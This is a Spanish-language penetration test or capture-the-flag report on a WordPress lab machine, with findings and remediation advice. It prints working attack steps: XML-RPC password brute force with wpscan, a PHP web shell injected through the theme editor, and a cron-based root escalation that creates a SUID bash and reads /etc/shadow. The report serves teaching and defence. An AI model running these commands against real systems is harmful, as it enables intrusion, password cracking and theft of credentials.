COMPROMISO TOTAL — ACCESO ROOT
01 · Resumen ejecutivo

Un servidor web público llevó a control total

El objetivo expone únicamente SSH y un servidor web Apache. Dentro del sitio web vive una instalación de WordPress protegida solo por una contraseña débil. A partir de ahí, una cadena de cuatro pasos encadenados permitió a un atacante sin credenciales previas pasar de no tener nada a controlar la máquina por completo, leyendo el fichero de contraseñas del sistema y ambas flags.

El punto crítico no fue un exploit exótico, sino una suma de malas prácticas corrientes: una contraseña adivinable, un panel de administración que permite editar código, y una tarea programada del sistema que ejecuta como root un script desde un directorio que el servidor web puede modificar.

04 · Cadena de ataque

De cero a root en seis pasos

  1. Descubrimiento de red

    Barrido ARP/ICMP de 192.168.20.0/24. El OUI 00:0C:29 delata una VM invitada de VMware frente a la infraestructura 00:50:56. Objetivo vivo: .132.

  2. Enumeración de servicios

    Escaneo completo de puertos: solo 22 y 80 abiertos. En el 80, un Apache por defecto esconde /wordpress/. La cabecera Link de wp-json revela el vhost academy.thl.

  3. Enumeración de WordPress

    wpscan identifica WordPress 6.5.3, el usuario dylan y el plugin file-manager. XML-RPC está habilitado.

  4. Acceso: fuerza bruta

    Fuerza bruta vía system.multicall de XML-RPC contra dylan con rockyou. Sin límite de intentos: dylan:password1 en segundos → acceso de administrador.

  5. Ejecución de código (RCE)

    Como admin, se inyecta PHP en el editor de temas (functions.php de twentytwentytwo). Shell web ejecutando como www-data bajo Apache.

  6. Escalada a root

    Un cron de root intenta ejecutar /opt/backup.sh, que no existe, en un directorio propiedad de www-data. Creamos ese script → root copia bash con SUID y vuelca ambas flags. Game over.

05 · Hallazgos en detalle

Análisis técnico y remediación

F-01

RCE autenticado vía editor de temas

Crítico

WordPress permite a un administrador editar los ficheros PHP del tema activo desde el propio panel. Al ser PHP ejecutable por el servidor, esto equivale a ejecución remota de código arbitrario.

Vector
Escribir <?php system($_GET['cmd']); ?> en functions.php del tema vía admin-ajax.php (acción edit-theme-plugin-file), usando un nonce fresco.
Impacto
Ejecución de comandos como www-data; pivote directo al sistema operativo.
curl -sG "http://academy.thl/wordpress/wp-content/themes/twentytwentytwo/functions.php" \
     --data-urlencode "cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
Remediación: definir DISALLOW_FILE_EDIT y DISALLOW_FILE_MODS en wp-config.php; el servidor web no debe tener permiso de escritura sobre el código de la aplicación.
F-02

Escalada a root: cron + directorio escribible + script ausente

Alto

Una tarea programada de root ejecuta periódicamente /opt/backup.sh. Ese fichero no existe, pero el directorio /opt es propiedad de www-data (drwxr-xr-x www-data root), así que el usuario web puede crearlo. Al siguiente ciclo, root ejecuta nuestro código.

Descubrimiento
En un escenario real, pspy64 revela sin privilegios qué binario lanza root — aquí, /opt/backup.sh, no el backup.py visible que despistaba.
Técnica
SUID sobre una copia de bash en /opt (no en /dev/shm, montado noexec). /opt/rootbash -p → euid=0.
# /opt/backup.sh creado por www-data, ejecutado por root:
cp /bin/bash /opt/rootbash
chmod 4755 /opt/rootbash
cat /root/root.txt > /dev/shm/root.txt
# Luego, como www-data:
/opt/rootbash -p -c 'id; cat /etc/shadow'
# uid=33(www-data) euid=0(root)  ← root
Remediación: los directorios y scripts que ejecuta root deben pertenecer a root y no ser escribibles por otros (chown root:root /opt, chmod 755). Nunca ejecutar desde cron rutas controlables por servicios menos privilegiados; usar rutas absolutas a binarios validados.
F-03

Credenciales débiles sin límite de intentos

Alto

El usuario dylan usa password1, presente en cualquier diccionario. XML-RPC (system.multicall) permite probar decenas de contraseñas por petición sin bloqueo ni CAPTCHA.

wpscan --url http://academy.thl/wordpress/ --usernames dylan \
       --passwords rockyou.txt --password-attack xmlrpc --max-threads 50
# [!] Valid Combinations Found:  dylan / password1   (82 peticiones, 10 s)
Remediación: política de contraseñas robustas + 2FA; limitar o deshabilitar xmlrpc.php; rate-limiting y bloqueo tras N fallos (p. ej. Fail2ban/WAF).
F-04

Credenciales en texto claro en /opt/backup.py

Medio

El script original contenía credenciales SSH embebidas (dylan:dylan123 hacia un host hoy inexistente). Secretos en código son reutilizables y sobreviven a rotaciones.

Remediación: mover secretos a un gestor (vault) o variables de entorno con permisos restringidos; rotar cualquier credencial expuesta.
F-05

Plugin wp-file-manager 6.5.1 desactualizado

Medio

La versión instalada está fuera de soporte. La familia wp-file-manager acumula vulnerabilidades críticas de subida/RCE (p. ej. CVE-2020-25213). Aun sin explotarse aquí, es una segunda vía de entrada latente.

Remediación: actualizar o retirar el plugin; mantener core, temas y plugins al día.
F-06

Fugas de información

Medio

Listado de directorios habilitado (/wp-content/uploads/, temas), readme.html expone la versión exacta, y XML-RPC está abierto. Facilitan el reconocimiento al atacante.

Remediación: desactivar Options Indexes en Apache, borrar readme.html, restringir XML-RPC y wp-cron externo.
06 · Recomendaciones

Prioridades de remediación

  • Inmediato — corregir permisos de /opt (dueño root, no escribible por el servicio web): rompe la escalada a root por sí solo.
  • Inmediato — contraseña fuerte para dylan + bloqueo de xmlrpc.php: cierra la puerta de entrada.
  • Corto plazo — DISALLOW_FILE_EDIT en WordPress y revocar la escritura del servidor web sobre su propio código.
  • Corto plazo — actualizar WordPress, temas y plugins; retirar wp-file-manager si no se usa.
  • Higiene — eliminar secretos del código, desactivar listados de directorios y banners de versión.

Defensa en profundidad: ninguno de estos fallos es, por separado, un desastre; su encadenamiento es lo que lleva a root. Romper un solo eslabón habría detenido la cadena.
